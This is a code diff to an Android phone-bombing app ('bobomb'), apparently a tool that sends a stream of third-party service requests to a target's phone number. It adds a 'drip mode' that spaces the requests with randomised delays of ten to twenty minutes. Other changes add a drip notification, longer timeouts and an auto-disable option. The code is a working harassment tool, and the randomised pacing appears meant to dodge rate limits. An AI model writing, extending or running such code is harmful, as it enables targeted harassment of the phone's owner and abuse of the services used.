@@ -15,6 +15,7 @@ import androidx.core.os.bundleOf
 import androidx.work.Data
 import androidx.work.Worker
 import androidx.work.WorkerParameters
+import java.util.Random
 import org.gooseprjkt.bobomb.R
 import org.gooseprjkt.bobomb.services.collectAll
 import org.gooseprjkt.bobomb.services.core.Callback
@@ -96,7 +97,11 @@ class AttackWorker(
         val repeats = inputData.getInt(KEY_REPEATS, 1)
         val chunkSize = inputData.getInt(KEY_CHUNK_SIZE, 10)
         val dripModeEnabled = inputData.getBoolean(KEY_DRIP_MODE, false)
-        val dripDelayMs = inputData.getLong(KEY_DRIP_DELAY_MS, 1200000L)
+        val dripDelayMs = inputData.getLong(KEY_DRIP_DELAY_MS, 900000L)
+        val dripRandomDelayEnabled = inputData.getBoolean(KEY_DRIP_RANDOM_DELAY_ENABLED, false)
+        val dripRandomDelayMinMs = inputData.getLong(KEY_DRIP_RANDOM_DELAY_MIN_MS, 600000L)
+        val dripRandomDelayMaxMs = inputData.getLong(KEY_DRIP_RANDOM_DELAY_MAX_MS, 1200000L)
+        val dripAutoDisable = inputData.getBoolean(KEY_DRIP_AUTO_DISABLE, false)
 
         val allServices = collectAll(repository.getAllRepositories(client)) { _, _, _ ->
 
@@ -157,7 +162,23 @@ class AttackWorker(
             }
 
             if (dripModeEnabled) {
-                Log.d(TAG, "Running in DRIP MODE with ${dripDelayMs}ms delay")
+                Log.d(TAG, "Running in DRIP MODE with ${dripDelayMs}ms delay, random=$dripRandomDelayEnabled")
+                
+                // Создаём уведомление с иконкой капли
+                val dripNotification = NotificationCompat.Builder(applicationContext, CHANNEL_ID)
+                    .setContentTitle("Капельный режим 💧")
+                    .setContentText("+$phone - отправка запросов с задержкой")
+                    .setSmallIcon(R.drawable.water_drop_24px)
+                    .setOngoing(true)
+                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .build()
+                
+                if (notificationsGranted) {
+                    notificationManager.notify(id.hashCode(), dripNotification)
+                }
+                
+                val random = Random()
+                
                 for ((index, service) in usableServices.withIndex()) {
                     if (isStopped) {
                         Log.i(TAG, "Attack stopped by user at cycle $cycle, service $index")
@@ -167,12 +188,10 @@ class AttackWorker(
 
                     try {
                         val latch = CountDownLatch(1)
-                        var serviceError: Exception? = null
-                        
+
                         service.run(client, object : Callback {
                             override fun onError(call: Call, e: Exception) {
                                 Log.e(TAG, "Service ${index}/${usableServices.size} error: ${e.message}")
-                                serviceError = e
                                 latch.countDown()
                             }
 
@@ -180,29 +199,41 @@ class AttackWorker(
                             override fun onResponse(call: Call, response: Response) {
                                 Log.d(TAG, "Service ${index}/${usableServices.size} response: ${response.code}")
                                 response.close()
-                                
-                                // Update progress and notification
-                                updateProgressAndNotification(phone, usableServices.size, repeats, progress, notificationManager)
-                                
+                                updateProgressAndNotification(phone, usableServices.size, repeats, progress, notificationManager, isDripMode = true)
                                 latch.countDown()
                             }
                         }, phone)
 
-                        // Wait for service with timeout (10 seconds)
-                        if (!latch.await(10, TimeUnit.SECONDS)) {
+                        // Wait for service with timeout (15 seconds for drip mode)
+                        if (!latch.await(15, TimeUnit.SECONDS)) {
                             Log.w(TAG, "Service ${index}/${usableServices.size} timed out, skipping...")
                         }
-                        
+
                     } catch (e: Exception) {
                         Log.e(TAG, "Service ${index}/${usableServices.size} crashed: ${e.message}", e)
-                        // Continue to next service instead of crashing the whole attack
                     }
 
                     progress++
 
                     if (index < usableServices.size - 1) {
-                        Thread.sleep(dripDelayMs)
+                        // Вычисляем задержку
+                        val delay = if (dripRandomDelayEnabled) {
+                            // Случайная задержка между min и max
+                            random.nextLong(dripRandomDelayMinMs, dripRandomDelayMaxMs)
+                        } else {
+                            dripDelayMs
+                        }
+                        
+                        Log.d(TAG, "Drip delay: ${delay / 1000}s")
+                        Thread.sleep(delay)
                     }
+                }
+                
+                // Авто-отключение drip mode после завершения атаки
+                if (dripAutoDisable) {
+                    val repository = MainRepository(applicationContext)
+                    repository.isDripModeEnabled = false
+                    Log.i(TAG, "Drip mode auto-disabled after attack")
                 }
             } else {
                 for ((index, service) in usableServices.withIndex()) {
@@ -265,7 +296,7 @@ class AttackWorker(
     }
 
     @SuppressLint("MissingPermission")
-    private fun updateProgressAndNotification(phone: Phone, totalServices: Int, repeats: Int, progress: Int, notificationManager: NotificationManagerCompat) {
+    private fun updateProgressAndNotification(phone: Phone, totalServices: Int, repeats: Int, progress: Int, notificationManager: NotificationManagerCompat, isDripMode: Boolean = false) {
         val intent = Intent(applicationContext, MainActivity::class.java)
         intent.putExtra(MainActivity.TASK_ID, id.toString())
 
@@ -283,11 +314,11 @@ class AttackWorker(
         )
 
         val notification = NotificationCompat.Builder(applicationContext, CHANNEL_ID)
-            .setContentTitle(applicationContext.getString(R.string.attack))
+            .setContentTitle(if (isDripMode) "Капельный режим 💧" else applicationContext.getString(R.string.attack))
             .setContentText("+$phone")
             .setProgress(totalServices * repeats, progress, false)
             .setOngoing(true)
-            .setSmallIcon(R.drawable.bobomb_logo)
+            .setSmallIcon(if (isDripMode) R.drawable.water_drop_24px else R.drawable.bobomb_logo)
             .setPriority(NotificationCompat.PRIORITY_HIGH)
             .addAction(R.drawable.ic_stop, applicationContext.getString(R.string.stop), pendingIntent)
             .build()
@@ -319,6 +350,10 @@ class AttackWorker(
         const val KEY_CHUNK_SIZE = "chunk_size"
         const val KEY_DRIP_MODE = "drip_mode"
         const val KEY_DRIP_DELAY_MS = "drip_delay_ms"
+        const val KEY_DRIP_RANDOM_DELAY_ENABLED = "drip_random_delay_enabled"
+        const val KEY_DRIP_RANDOM_DELAY_MIN_MS = "drip_random_delay_min_ms"
+        const val KEY_DRIP_RANDOM_DELAY_MAX_MS = "drip_random_delay_max_ms"
+        const val KEY_DRIP_AUTO_DISABLE = "drip_auto_disable"
 
         private const val CHANNEL_ID = "attack"
 
